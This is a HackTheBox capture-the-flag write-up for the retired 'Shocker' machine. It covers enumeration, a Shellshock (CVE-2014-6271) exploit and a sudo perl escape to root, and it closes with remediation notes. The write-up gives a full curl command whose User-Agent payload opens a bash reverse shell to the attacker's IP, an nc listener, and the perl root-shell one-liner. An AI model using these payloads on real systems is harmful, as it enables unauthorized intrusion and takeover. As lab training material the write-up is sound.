HTB Shocker: Shellshock CGI to shell, perl sudo to root

retired-machineeasy

Shocker is a retired HackTheBox easy Linux machine named for exactly one bug: Shellshock. Synopsis: a .sh in /cgi-bin plus CVE-2014-6271, then a textbook perl NOPASSWD sudo for root.

$ Enumeration — find the CGI

# bash: scan and fuzz for cgi-bin
nmap -sC -sV 10.10.10.56
gobuster dir -u http://10.10.10.56 -w common.txt -x sh,cgi,pl  # -> /cgi-bin/user.sh

Apache with /cgi-bin/ containing user.sh — a CGI shell script. CGI plus bash plus 2014-era software is the whole threat model.

$ Foothold — Shellshock (CVE-2014-6271)

# bash: User-Agent RCE to reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.23/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
nc -lvnp 4444

Bash processes attacker-controlled CGI environment variables, so the crafted User-Agent executes server-side. Land as the low-privilege shelly user. Aim at user.sh — Shellshock needs the bash CGI execution path.

$ Privilege escalation — sudo perl

# bash: perl escape to root
sudo -l   # (root) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/sh";'
id   # uid=0(root)

Perl can exec anything, so one sudo line is an instant root shell. Two CVEs, two one-liners, total compromise. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Testing the header against the main site instead of the CGI script, and forgetting URL-encoding quirks (prove the shape with a sleep/id callback first).

$ Remediation notes

Patch bash everywhere, remove CGI where possible, and treat NOPASSWD on interpreters as passwordless root. Written by Lucky Thandel.
